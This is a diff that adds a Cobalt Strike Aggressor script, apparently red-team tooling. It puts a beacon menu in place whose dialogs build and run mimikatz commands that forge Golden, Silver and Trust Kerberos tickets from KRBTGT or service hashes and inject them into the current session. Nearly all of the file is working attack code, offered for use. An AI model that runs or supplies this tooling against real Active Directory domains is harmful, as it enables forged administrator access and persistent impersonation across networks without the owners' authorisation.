@@ -1,0 +1,84 @@
+# CreateTicket Aggressor Script 
+# Author: @captmeelo
+# Blog: https://captmeelo.com/
+# GitHub: https://github.com/capt-meelo
+
+popup beacon_bottom {
+    menu "Create Ticket" {
+		item "Golden Ticket" {
+			createGoldenTicket($1);
+		}
+		item "Silver Ticket" {
+			createSilverTicket($1);
+		}
+		item "Trust Ticket" {
+			createTrustTicket($1);
+		}
+    }
+}
+
+sub createGoldenTicket {	
+	$bid = $1;
+	
+	$dialog = dialog("Golden Ticket", %(user => "Administrator", domain => "domain.local", domain_SID => "S-1-5-21-000000000-1111111111-2222222222"), lambda({			
+			$command = "kerberos::golden /user:$3['user'] /domain:$3['domain'] /sid:$3['domain_SID'] /krbtgt:$3['krbtgt_hash'] $3['custom_args'] /endin:600 /renewmax:10080 /ptt";
+			binput($bid, "mimikatz $command");
+			bmimikatz($bid, $command);
+		})
+	);
+	
+	dialog_description($dialog, "Generate a golden ticket and inject it into the current session.");
+	drow_text($dialog, "user", "User to Impersonate: ");
+    drow_text($dialog, "domain", "Domain FQDN: ");
+    drow_text($dialog, "domain_SID", "Domain SID: ");
+    drow_krbtgt($dialog, "krbtgt_hash", "KRBTGT Hash: ");
+	drow_text($dialog, "custom_args", "Custom Args: ");
+	dbutton_action($dialog, "Run");
+	dbutton_help($dialog, "https://adsecurity.org/?page_id=1821#KERBEROSGolden");
+	dialog_show($dialog);
+}
+
+sub createSilverTicket {	
+	$bid = $1;
+
+	$dialog = dialog("Silver Ticket", %(user => "ServerAdmin", domain => "domain.local", domain_SID => "S-1-5-21-000000000-1111111111-2222222222", target_host => "srv01.domain.local", service => "cifs"), lambda({			
+			$command = "kerberos::golden /user:$3['user'] /domain:$3['domain'] /sid:$3['domain_SID'] /target:$3['target_host'] /rc4:$3['target_hash'] /service:$3['service'] $3['custom_args'] /endin:600 /renewmax:10080 /ptt";
+			binput($bid, "mimikatz $command");
+			bmimikatz($bid, $command);
+		})
+	);
+	
+	dialog_description($dialog, "Create a silver ticket and inject it into the current session.");
+	drow_text($dialog, "user", "User to Impersonate: ");
+    drow_text($dialog, "domain", "Domain FQDN: ");
+    drow_text($dialog, "domain_SID", "Domain SID: ");
+	drow_text($dialog, "target_host", "Target Host FQDN: ");
+	drow_text($dialog, "target_hash", "Target Host Hash (RC4): ");
+    drow_text($dialog, "service", "Service: ");
+	drow_text($dialog, "custom_args", "Custom Args: ");
+	dbutton_action($dialog, "Run");
+	dbutton_help($dialog, "https://adsecurity.org/?page_id=1821#SilverTicket");
+	dialog_show($dialog);
+}
+
+sub createTrustTicket {	
+	$bid = $1;
+	
+	$dialog = dialog("Trust Ticket", %(user => "Administrator", domain => "domain.local", domain_SID => "S-1-5-21-000000000-1111111111-2222222222", SID_history => "S-1-5-21-3333333333-4444444444-555555555-519"), lambda({			
+			$command = "kerberos::golden /user:$3['user'] /domain:$3['domain'] /sid:$3['domain_SID'] /sids:$3['SID_history'] /krbtgt:$3['krbtgt_hash'] $3['custom_args'] /endin:600 /renewmax:10080 /ptt";
+			binput($bid, "mimikatz $command");
+			bmimikatz($bid, $command);
+		})
+	);
+	
+	dialog_description($dialog, "Generate a trust ticket and inject it into the current session.");
+	drow_text($dialog, "user", "User to Impersonate: ");
+    drow_text($dialog, "domain", "Domain FQDN: ");
+    drow_text($dialog, "domain_SID", "Domain SID: ");
+	drow_text($dialog, "SID_history", "SID History: ");
+    drow_krbtgt($dialog, "krbtgt_hash", "KRBTGT Hash: ");
+	drow_text($dialog, "custom_args", "Custom Args: ");
+	dbutton_action($dialog, "Run");
+	dbutton_help($dialog, "https://adsecurity.org/?page_id=1821#TrustTicket");
+	dialog_show($dialog);
+}
